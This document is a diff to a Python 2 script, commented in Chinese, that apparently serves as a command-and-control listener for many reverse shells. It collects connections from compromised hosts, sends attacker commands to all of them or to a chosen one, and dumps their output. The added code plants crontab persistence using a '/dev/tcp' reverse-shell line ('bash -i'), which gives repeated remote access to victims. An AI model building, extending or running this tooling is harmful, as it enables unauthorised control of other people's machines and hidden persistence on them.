@@ -1,35 +1,59 @@
 # *- coding: utf-8 -*
 
 import json
+import random
 import socket
 import threading
 import time
-from base64 import b64encode
-from hashlib import sha1
+import traceback
 
 lootedShell = {}
+
+LPORT = 7777
+MAX_CONN_PER_HOST = 3
+SPECIAL_STRING_FRONT = "#RANDOM#->"
+SPECIAL_STRING_BEHIND = "<-#RANDOM#"
+CRONTAB = [
+    "* * * * * bash -i >& /dev/tcp/127.0.0.1/1234 0>&1",
+]
+TIME_WAIT_VERIFY = 3
 
 def listen(sck, lport):
     sck.bind(("0.0.0.0", lport))
     sck.listen(3)
     while True:
         subsck, addr = sck.accept()
-        uuid = "%s%f" % (str(addr), time.time())
-        uuid = sha1(uuid).hexdigest()
-        lootedShell[uuid] = {"died": False, "sck": subsck, "addr": addr, "time": time.time(), "history": bytearray()}
-        t = threading.Thread(target=recv, args=(subsck, uuid))
-        t.setDaemon(True)
-        t.start()
+        host = addr[0]
+        port = addr[1]
+        if not host in lootedShell:
+            lootedShell[host] = {}
+        if len(lootedShell[host]) < MAX_CONN_PER_HOST:
+            if port in lootedShell[host]: # 可能出于某些神奇原因原来的连接还在的话...
+                try:
+                    lootedShell[host][port]["sck"].close()
+                except Exception:
+                    pass
+            lootedShell[host][port] = {"died": False, "sck": subsck, "addr": addr, "time": time.time(), "history": bytearray()}
+            t = threading.Thread(target=recv, args=(subsck, addr))
+            t.setDaemon(True)
+            t.start()
+        else:
+            try:
+                subsck.close()
+            except Exception:
+                pass
 
 
-def recv(sck, uuid):
+def recv(sck, addr):
+    host = addr[0]
+    port = addr[1]
     try:
         while True:
-            lootedShell[uuid]["time"] = time.time()
-            lootedShell[uuid]["history"].extend(sck.recv(1024))
+            lootedShell[host][port]["history"].extend(sck.recv(1024))
+            lootedShell[host][port]["time"] = time.time()
     except Exception:
-        if uuid in lootedShell:
-            lootedShell[uuid]["died"] = True
+        if host in lootedShell and port in lootedShell[host]:
+            lootedShell[host][port]["died"] = True
 
 
 def send(cmd):
@@ -37,35 +61,83 @@ def send(cmd):
     print "[*] Using %s" % cmd
     cmd += "\n"
     count = 0
-    for i in lootedShell:
-        if not lootedShell[i]["died"]:
-            try:
-                lootedShell[i]["sck"].send(cmd.encode())
-                count += 1
-            except Exception:
-                lootedShell[i]["died"] = True
+    for host in lootedShell:
+        for port in lootedShell[host]:
+            if not lootedShell[host][port]["died"]:
+                try:
+                    lootedShell[host][port]["sck"].send(cmd)
+                    count += 1
+                except Exception:
+                    lootedShell[host][port]["died"] = True
     print "[*] Has been sended to %d shells" % count
+
+
+def sendwe(cmd):
+    # 可以用 f"{SPECIAL_STRING_FRONT}([\S\s]*?){SPECIAL_STRING_BEHIND}" 来快速捕捉输出
+    tmp = "%s\"\"%s" % (SPECIAL_STRING_FRONT[0], SPECIAL_STRING_FRONT[1:]) # 在中间加一个 "", 使得反射回来的命令不会被捕捉到
+    cmd = "echo -n \"%s\";%s;echo -n \"%s\";" % (tmp, cmd, SPECIAL_STRING_BEHIND)
+    print "[*] Using %s" % cmd
+    cmd += "\n"
+    count = 0
+    for host in lootedShell:
+        for port in lootedShell[host]:
+            if not lootedShell[host][port]["died"]:
+                try:
+                    lootedShell[host][port]["sck"].send(cmd)
+                    count += 1
+                except Exception:
+                    lootedShell[host][port]["died"] = True
+    print "[*] Has been sended to %d shells" % count
+
+
+def sendsp(mixed):
+    mixed = mixed.lstrip()
+    if mixed.find(' ') == -1:
+        print "[-] Please input right format using `sendsp [host] [cmd]`"
+        return
+    pos = mixed.find(' ')
+    host = mixed[:pos]
+    cmd = mixed[pos:]
+    if not host in lootedShell:
+        print "[-] Host %s not found" % host
+        return
+    print "[*] Sending %s to %s" % (cmd, host)
+    cmd += "\n"
+    tmp = random.choice(list(lootedShell[host]))
+    lootedShell[host][tmp]["sck"].send(cmd)
+
+
+def cron(placeholder):
+    # 尝试用 crontab 持久化, 可以再开一个专门的端口来接
+    cmdFinal = "echo -e \""
+    for cmd in CRONTAB:
+        cmdFinal += cmd
+        cmdFinal += "\\n"
+    cmdFinal += "\" > /tmp/sess_87ja0rn7tkutlo61k091du52l7;crontab /tmp/sess_87ja0rn7tkutlo61k091du52l7;rm /tmp/sess_87ja0rn7tkutlo61k091du52l7;"
+    send(cmdFinal)
 
 
 def info(placeholder):
     count = 0
-    hosts = set()
-    for i in lootedShell:
-        if lootedShell[i]["died"]:
-            pass
-        else:
+    aliveCount = 0
+    for host in lootedShell:
+        for port in lootedShell[host]:
             count += 1
-            hosts.add(lootedShell[i]['addr'][0])
-            print "[*] %s" % str(lootedShell[i]['addr'])
-    print "[*] %d shells in total, %d alive, %d hosts" % (len(lootedShell), count, len(hosts))
+            if lootedShell[host][port]["died"]:
+                pass
+            else:
+                aliveCount += 1
+                print "[*] %s" % str(lootedShell[host][port]['addr'])
+    print "[*] %d shells in total, %d alive, %d hosts" % (count, aliveCount, len(lootedShell))
 
 
 def dump(filename):
     result = []
-    for i in lootedShell:
-        tmp = lootedShell[i]
-        history = tmp["history"].decode('latin') # 只支持英文, 但是这样 json dump 起来方便
-        result.append({"died": tmp["died"], "addr": tmp["addr"], "time": tmp["time"], "history": history})
+    for host in lootedShell:
+        for port in lootedShell[host]:
+            tmp = lootedShell[host][port]
+            history = tmp["history"].decode('latin') # 只支持英文, 但是这样 json dump 起来方便
+            result.append({"died": tmp["died"], "addr": tmp["addr"], "time": tmp["time"], "history": history})
 
     if len(filename) == 0:
         filename = "dump-%f.json" % time.time()
@@ -80,24 +152,54 @@ def dump(filename):
 
 def flush(filename):
     dump(filename)
-    for i in list(lootedShell):
-        if lootedShell[i]["died"]:
-            lootedShell.pop(i)
-        else:
-            lootedShell[i]["history"] = bytearray()
-    print "[*] Flush success"
+    diedShell = 0
+    for host in list(lootedShell):
+        for port in list(lootedShell[host]):
+            if lootedShell[host][port]["died"]:
+                lootedShell[host].pop(port)
+                diedShell += 1
+                if len(lootedShell[host]) == 0:
+                    lootedShell.pop(host)
+            else:
+                lootedShell[host][port]["history"] = bytearray()
+    print "[*] Flush success, %d died shells were swept" % diedShell
 
 
-def help():
+def verify(placeholder):
+    verifyStr = "###"
+    for _ in range(10):   
+        verifyStr += str(random.randint(0, 9999))
+        verifyStr += "###"
+    tmp = "echo \"" + verifyStr[0] + "\"\"" + verifyStr[1:] + "\""
+    send(tmp)
+    print "[*] Wait %s second for verify..." % TIME_WAIT_VERIFY
+    time.sleep(TIME_WAIT_VERIFY)
+    print "[*] Now staring verify"
+    for host in lootedShell:
+        for port in lootedShell[host]:
+            if lootedShell[host][port]["history"].rfind(verifyStr) == -1:
+                lootedShell[host][port]["died"] = True
+    flush("")
+
+
+def help(placeholder):
     print "[*] Help:"
     print "[1] exec [cmd]"
     print "    Command after exec will be send to all shells"
-    print "[2] info"
+    print "[2] execwe [cmd]"
+    print "    Exec with echo, friendly with regex"
+    print "[3] execsp [host] [cmd]"
+    print "    Exec with special host"
+    print "[4] cron"
+    print "    Try to persistence with crontab"
+    print "[5] info"
     print "    Get curr shell infos"
-    print "[3] dump (filename)"
+    print "[6] dump (filename)"
     print "    Dump all result to file"
-    print "[4] flush (filename)"
+    print "[7] flush (filename)"
     print "    Dump all result and flush died shells and history"
+    print "[8] verify"
+    print "    Verify shells with echo"
 
 
 def main(lport):
@@ -107,19 +209,28 @@ def main(lport):
     t.start()
     mapping = {
         "exec": send,
+        "execwe": sendwe,
+        "execsp": sendsp,
+        "cron": cron,
         "info": info,
         "dump": dump,
-        "flush": flush
+        "flush": flush,
+        "verify": verify,
+        "help": help,
+        "?": help
     }
     while True:
         try:
             i = raw_input(">>> ").strip()
             choice = i.split(" ")[0]
             if choice in mapping:
-                mapping[choice](i[len(choice) + 1:]) # 将命令后面的传给函数作为参数
+                try:
+                    mapping[choice](i[len(choice) + 1:])  # 将命令后面的传给函数作为参数
+                except Exception:
+                    traceback.print_exc()
             else:
                 if len(i) != 0:
-                    help()
+                    print "[-] Invalid command, use 'help' to get more information"
         except (KeyboardInterrupt, EOFError):
             while True:
                 try:
@@ -135,4 +246,4 @@ def main(lport):
                 else:
                     break
 
-main(7777)
+main(LPORT)
